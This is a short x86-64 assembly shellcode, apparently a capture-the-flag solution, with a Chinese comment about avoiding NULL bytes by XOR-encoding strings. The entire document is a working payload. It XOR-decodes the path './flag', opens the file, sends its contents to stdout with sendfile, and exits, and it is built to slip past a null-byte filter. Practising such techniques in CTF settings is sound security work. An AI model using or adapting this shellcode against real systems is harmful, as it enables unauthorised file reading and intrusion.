# 禁用NULL 0x00 考虑用两次异或来还原字符串
.global _start
_start:
.intel_syntax noprefix
        xor al, al
        mov al, 2
        mov rdi, 0x010166606d672e2f
        mov r8, 0x0101010101010101
        xor rdi, r8
        push rdi
        mov rdi, rsp
        xor esi, esi
        xor edx, edx
        syscall
        mov esi, eax
        mov al, 40
        xor edi, edi
        inc edi
        mov r10w, 0x3e8
        syscall
        mov al, 60
        xor edi, edi
        syscall
